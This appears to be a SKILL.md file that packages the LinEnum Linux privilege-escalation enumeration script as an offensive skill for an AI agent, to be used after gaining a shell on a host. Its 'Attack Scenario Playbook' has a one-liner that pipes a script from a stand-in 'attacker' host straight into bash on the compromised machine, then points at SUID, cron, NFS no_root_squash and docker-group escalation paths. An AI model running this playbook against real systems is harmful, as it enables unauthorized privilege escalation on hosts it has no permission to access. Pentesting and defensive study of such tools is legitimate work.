---
name: linenum-privesc-scan
description: "LinEnum: Post-shell system enumeration. Signals: Linux privilege escalation, SUID, export results, highlighted keywords."
zh-signals: "LinEnum: 拿 shell 后系统枚举。信号:linux提权,suid,导出结果,高亮关键字。"
when-to-use: >-
  Use when you have a shell on a Linux host and need to enumerate privilege
  escalation vectors such as SUID binaries, cron jobs and writable services.
---

# LinEnum

- Attack Category: C16 Linux Local Privilege Escalation
- Upstream Repository: https://github.com/rebootuser/LinEnum
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
curl -o LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./LinEnum.sh -t` | Thorough full enumeration |
| `-r report -e /tmp/` | Export results |
| `-k keyword` | Highlighted keywords |
| `-s` | Current user level only (runs without root) |

## Attack Scenario Playbook

### System enumeration after gaining a shell

```bash
curl -s http://attacker/LinEnum.sh | bash -s -- -t -r enum -e /tmp/
# Focus on: SUID/Cron/writable services/NFS no_root_squash/docker group
```

## Notes

Output is graded by color (red = high risk); the modern replacement is linpeas, but LinEnum is a zero-dependency single file that suits minimal deployment.
